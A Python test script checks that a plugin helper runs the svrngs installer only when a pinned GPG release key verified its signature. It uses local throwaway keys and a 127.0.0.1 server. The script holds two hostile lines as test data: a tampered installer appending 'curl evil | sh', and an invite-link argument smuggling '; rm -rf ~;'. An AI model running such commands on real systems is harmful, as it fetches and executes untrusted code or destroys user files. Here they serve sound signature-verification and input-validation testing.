#!/usr/bin/python3 -I
"""Get svrngs: the helper runs svrngs's installer only when its signature
verifies against the key in the plugin's keys/, by the fingerprint pinned
there. A stand-in release is served from 127.0.0.1; its keys are made
here, so no real key, release or svrngs is used."""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
failures = []


def check(name, got, want):
    print(f"  {'ok  ' if got == want else 'FAIL'} {name}" + ("" if got == want else f": got {got!r}, wanted {want!r}"))
    if got != want:
        failures.append(name)


class Quiet(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


with tempfile.TemporaryDirectory(prefix="svrngs-fam-get-test-") as directory:
    scratch = Path(directory)
    gnupg = scratch / "gnupg"
    gnupg.mkdir(mode=0o700)
    gpg = ["gpg", "--batch", "--no-tty", "--homedir", str(gnupg), "--passphrase", ""]

    def key(name):
        subprocess.run(gpg + ["--quick-generate-key", name, "ed25519", "sign", "1d"], check=True, capture_output=True)
        listed = subprocess.run(gpg + ["--with-colons", "--fingerprint", name], check=True, capture_output=True, text=True).stdout
        return next(line.split(":")[9] for line in listed.splitlines() if line.startswith("fpr"))

    release_key, impostor = key("svrngs releases (test)"), key("someone else")

    def sign(path, by):
        subprocess.run(gpg + ["--yes", "--local-user", by, "--detach-sign", "--output", f"{path}.sig", str(path)], check=True, capture_output=True)

    # The plugin as installed: its helper, and keys/ holding the release key.
    plugin = scratch / "plugin"
    (plugin / "bin").mkdir(parents=True)
    shutil.copy(ROOT / "bin/svrngs-fam", plugin / "bin/svrngs-fam")
    (plugin / "keys").mkdir()
    exported = subprocess.run(gpg + ["--armor", "--export", release_key], check=True, capture_output=True).stdout
    (plugin / "keys/svrngs-release-key.asc").write_bytes(exported)
    (plugin / "keys/svrngs-release-key.fpr").write_text(release_key + "\n")

    # Releases, each a folder the stand-in serves.
    installer = '#!/bin/sh\nprintf "%s\\n" "$@" > "$HOME/installed-with"\necho "svrngs runs now."\n'
    served = scratch / "served"
    for name, signer, tamper in (("good", release_key, False), ("tampered", release_key, True), ("impostor", impostor, False)):
        folder = served / name
        folder.mkdir(parents=True)
        (folder / "install.sh").write_text(installer)
        sign(folder / "install.sh", signer)
        if tamper:
            (folder / "install.sh").write_text(installer + "curl evil | sh\n")
    (served / "empty").mkdir()
    server = ThreadingHTTPServer(("127.0.0.1", 0), partial(Quiet, directory=str(served)))
    threading.Thread(target=server.serve_forever, daemon=True).start()

    def get(release, *args):
        home = Path(tempfile.mkdtemp(dir=scratch))
        env = {"HOME": str(home), "PATH": "/usr/bin:/bin", "SVRNGS_FAM_SVRNGS": "",
               "SVRNGS_FAM_RELEASES": f"http://127.0.0.1:{server.server_address[1]}/{release}"}
        done = subprocess.run([str(plugin / "bin/svrngs-fam"), "get", *args], capture_output=True, text=True, env=env, timeout=120)
        ran = home / "installed-with"
        return json.loads(done.stdout), ran.read_text().split() if ran.exists() else None

    print("a release whose installer the release key signed")
    said, ran = get("good")
    check("installs", said["ok"], True)
    check("the installer is run for the page, with no link", ran, ["https://group.svrnme.sh/"])
    said, ran = get("good", "--link", "svrngs:AbCdEf0123456789")
    check("with an invite link, for that link", ran, ["svrngs:AbCdEf0123456789"])

    print("anything else is never run")
    said, ran = get("tampered")
    check("an installer changed after it was signed is refused", (said["ok"], ran), (False, None))
    check("and says why", "isn't signed by the svrngs release key" in said["said"], True)
    said, ran = get("impostor")
    check("one signed by another key is refused", (said["ok"], ran), (False, None))
    (plugin / "keys/svrngs-release-key.fpr").write_text(impostor + "\n")
    said, ran = get("good")
    check("a key whose fingerprint isn't the pinned one is refused", (said["ok"], ran), (False, None))
    (plugin / "keys/svrngs-release-key.fpr").write_text(release_key + "\n")
    said, ran = get("empty")
    check("a release with no signed installer says so", (said["ok"], ran, "no signed installer yet" in said["said"]), (False, None, True))
    said, ran = get("good", "--link", "'; rm -rf ~; '")
    check("something that isn't an invite link is refused", (said["ok"], ran), (False, None))
    server.shutdown()

print("ALL OK" if not failures else f"{len(failures)} FAILED")
sys.exit(1 if failures else 0)
